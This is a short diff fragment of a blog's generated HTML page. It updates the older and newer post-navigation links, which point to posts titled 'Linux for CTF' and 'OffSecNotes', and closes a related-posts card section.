+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
     </div> <!-- .card-deck -->
   </div> <!-- #related-posts -->
 
@@ -2166,17 +2334,17 @@ Steps:
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/Linux-for-CTF/" class="btn btn-outline-primary"
+  <a href="/posts/OffSec-Notes/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>Linux for CTF</p>
+    <p>OffSecNotes</p>
   </a>
   
 
   
-  <a href="/posts/OffSec-Notes/" class="btn btn-outline-primary"
+  <span class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>OffSecNotes</p>
-  </a>
+    <p>-</p>
+  </span>
   
 
 </div>
